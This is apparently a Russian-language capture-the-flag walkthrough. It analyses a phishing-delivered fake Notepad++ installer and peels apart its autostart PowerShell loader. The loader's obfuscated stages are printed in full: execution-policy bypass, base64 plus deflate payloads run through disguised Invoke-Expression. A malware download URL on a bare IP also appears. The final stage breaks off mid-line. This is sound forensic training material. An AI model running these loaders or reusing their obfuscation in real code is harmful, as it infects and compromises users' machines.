импортируем .ova в virtual box
находим креды в описании и заходим в систему

### Враг врага 1-1

открываем Thunderbird, переходим в параметры учетной записи => параметры сервера. Листаем вниз и видим локальный каталог.
открываем папку по пути C:\Users\romanov.DOMAIN\AppData\Roaming\Thunderbird\Profiles\df11xpz9.default-esr\ImapMail\10.10.12.14\
наодим файл INBOX.
в файле находи сообщения с этой почты, но они зашифрованы. 
по шифру видно что это Base64 кидаем его в онлайн дешифратор и видим перед собой кракозябры.
полученный результат закидываем на https://2cyr.com/decode/?lang=ru и выбираем автоматическое определение кодировки.
получаем сообщение " Предыдущее сообщение было отправлено с скомпромитированного аккаунта. Если приложене было установленно переустановите используя архив по следующей ссылке"
следующим сообщением как раз и приходит ссылка на тот самый архив http://91.149.202.121:8125/np++.zip

### Враг врага 1-2

внутри скачанного архива находится самараспаковывающийся архив а в нем вредоносный файл notepad++



### Враг-врага 1-7, 1-8

для решения этих заданий нам потребуется понять что делает файл который оказался в автозапуске после запуска вируса.
открываем диспетчер задач и смотрим в раздел автозапуска. видим там странный файл .startup.bat
откроем его с помощью блокнота и увидем очень неприятный для чтения код.


<details>

<summary>PowerShell-script</summary>
```
PoweRShELL -noPROFIL -WINDo  Hi  -nOnIntera  -EP BypaSS -NoEX  -NoL   "( nEw-OBJECT iO.StREAMreAdEr((nEw-OBJECT Io.ComPRESsiON.dEFLATEstrEaM( [io.mEmORYsTReAM][SYStEm.CoNVert]::FromBasE64stRINg( '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') , [io.cOmPrEsSion.CoMpReSsIonMoDE]::DECOMpREss) ),[tExT.encOdiNg]::aScii) ).ReAdToEnd( )| & ( $sHELlid[1]+$sHellid[13]+'X')"
```
</details>

После изучения понимаем что код декодирует base64 строку и разжимает ее c помощью алгоритма deflate, а после выполняет то что получилось в итоге.
закинем строку в https://jgraph.github.io/drawio-tools/tools/convert.html и получим новый скрипт


<details>

<summary>код полученный из Base64 строки</summary>
```
'МНОГО СИМВОЛОВ ПРОБЕЛА' |% {$RwblAT = $_ -isPlIt '  ' | %{' ' ;$_.SPlIt(' ')|% { $_.LengtH -1}} ; & ( ''.iNDEXoF.ToStrIng()[427,152,196]-JoIn'')( -jOiN ([cHAr[]] [InT[]]($RwblAT[0..($RwblAT.LengtH-1)] -jOiN '').TRiM('  ' ).SPlIt( ' ')))}
```
</details>

Теперь мы видим перед собой еще более страшный код. В самом конце мы видим
```
|% {$RwblAT = $_ -isPlIt '  ' | %{' ' ;$_.SPlIt(' ')|% { $_.LengtH -1}} ; & ( ''.iNDEXoF.ToStrIng()[427,152,196]-JoIn'')( -jOiN ([cHAr[]] [InT[]]($RwblAT[0..($RwblAT.LengtH-1)] -jOiN '').TRiM('  ' ).SPlIt( ' ')))}
```

эта часть кода как то преобразует пробелы в код и выполняет его. если мы сможем вместо выполнения просто вывести результат то узнаем что делает этот страшный код.
спустя три часа гуглинга понимаем что 
```
''.IndexOf.ToString()[427,152,196]-Join''
```
и есть та часть кода которая запускает обфусцированный код
уберем ее и получим в итоге
```
|% {$RwblAT = $_ -isPlIt '  ' | %{' ' ;$_.SPlIt(' ')|% { $_.LengtH -1}} ; ( -jOiN ([cHAr[]] [InT[]]($RwblAT[0..($RwblAT.LengtH-1)] -jOiN '').TRiM('  ' ).SPlIt( ' ')))}
```
запустим получившийся код(вместе с пробелами) в повершелл и снова получаем какой то странный код. Правда этот код очень похож на изначальный так что мы уже знаем что с ним делать.

<details>

<summary>Новый код</summary>

```
.( $ENV:CoMSPeC[4,26,25]-JOiN'') (NeW-oBJeCt sySTeM.IO.stReAmrEaDER(( NeW-oBJeCt sYSTeM.io.COMpREsSiON.deFlATEstreAM([iO.mEMOrysTreAM][conVeRT]::FRomBASe64STRINg( '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' ),[System.iO.COMpReSSIoN.CoMPreSSIonMOde]::DecoMpreSS) ) , [SYstem.TexT.ENCOding]::Ascii)).READtoEND()

```
</details>
кидаем base64 строку в https://jgraph.github.io/drawio-tools/tools/convert.html
и получаем


<details>

<summary>Новый код</summary>

```
  Set-Variable ("4"+"2J")  (  [TYPe]("{0}{2}{4}{1}{3}" -f 'SySte','Ve','m.','rT','Con')  );   sET-ITEM ("{3}{1}{2}{0}"-f'f4Eh','IaBle',':Y','Var')  ( [TYpe]("{3}{2}{1}{6}{5}{4}{7}{0}"-f'Ode','ComPRe','prEssIon.','iO.CoM','iO','s','s','NM'))  ;  ${8`Wg} = [TYPe]("{1}{3}{2}{0}" -F 'g','tEXt.e','CODin','n');  ( &("{3}{2}{1}{0}" -f 't','bjEc','o','nEW-')  ("{1}{4}{2}{0}{3}" -f'testReA','IO','A','M','.COMPrESsIoN.DeFL')([IO.MemORySTREAM]  ( variaBle ("4"+"2j")  )."V`ALue"::("{0}{1}{2}{3}"-f'F','rOmb','asE64sTRIn','G').Invoke( ("{19}{35}{14}{53}{17}{25}{55}{48}{13}{27}{30}{45}{38}{44}{49}{41}{56}{47}{6}{18}{22}{23}{34}{12}{3}{20}{2}{37}{0}{9}{43}{40}{8}{46}{4}{1}{33}{57}{42}{36}{52}{16}{26}{28}{15}{21}{31}{24}{10}{39}{29}{51}{54}{11}{50}{32}{5}{7}"-f 